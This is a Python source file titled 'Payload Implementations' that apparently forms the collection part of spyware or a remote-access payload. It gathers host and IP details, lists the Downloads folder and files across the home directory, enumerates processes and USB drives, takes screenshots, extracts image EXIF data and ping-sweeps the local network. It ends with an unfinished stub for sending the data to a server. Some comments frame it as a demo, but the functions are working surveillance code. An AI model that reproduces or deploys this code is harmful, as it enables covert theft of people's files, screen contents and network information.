import os
import platform
import socket
import subprocess
import psutil
import json
import time
from pathlib import Path
from PIL import ImageGrab, ExifTags, Image

# ==========================
#  Payload Implementations
# ==========================

def system_info():
    """Collect basic system information"""
    info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "platform": platform.platform(),
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "architecture": platform.machine(),
        "processor": platform.processor(),
    }
    return info


def file_access():
    """List contents of Downloads folder and walk home directory"""
    downloads = Path.home() / "Downloads"
    home = Path.home()

    results = {
        "downloads": [str(f) for f in downloads.glob("*")] if downloads.exists() else [],
        "home_walk": []
    }

    for root, dirs, files in os.walk(home):
        for file in files:
            results["home_walk"].append(str(Path(root) / file))
        # stop after 50 files to avoid overload
        if len(results["home_walk"]) > 50:
            break

    return results


def running_processes():
    """List all running processes"""
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            processes.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return processes


def usb_detection():
    """List connected USB storage devices"""
    usb_devices = []
    partitions = psutil.disk_partitions(all=False)
    for p in partitions:
        if 'removable' in p.opts or 'cdrom' in p.opts:
            usb_devices.append({"device": p.device, "mountpoint": p.mountpoint, "fstype": p.fstype})
    return usb_devices


def screenshot():
    """Capture a screenshot and save as PNG"""
    file_name = f"screenshot_{int(time.time())}.png"
    image = ImageGrab.grab()
    image.save(file_name)
    return {"screenshot_file": file_name}


def exif_data(image_path):
    """Extract EXIF metadata from an image"""
    metadata = {}
    try:
        img = Image.open(image_path)
        exif_data = img._getexif()
        if exif_data:
            for tag, value in exif_data.items():
                decoded = ExifTags.TAGS.get(tag, tag)
                metadata[decoded] = str(value)
    except Exception as e:
        metadata["error"] = str(e)
    return metadata


def network_scan():
    """Simulate a local network scan (ping 192.168.1.x)"""
    live_hosts = []
    base_ip = "192.168.1."
    for i in range(1, 10):  # keep it small for demo
        ip = base_ip + str(i)
        try:
            result = subprocess.run(["ping", "-n", "1", ip], capture_output=True)
            if result.returncode == 0:
                live_hosts.append(ip)
        except Exception:
            pass
    return {"live_hosts": live_hosts}


def upload_simulation(data):
    """Simulate sending data to a server"""
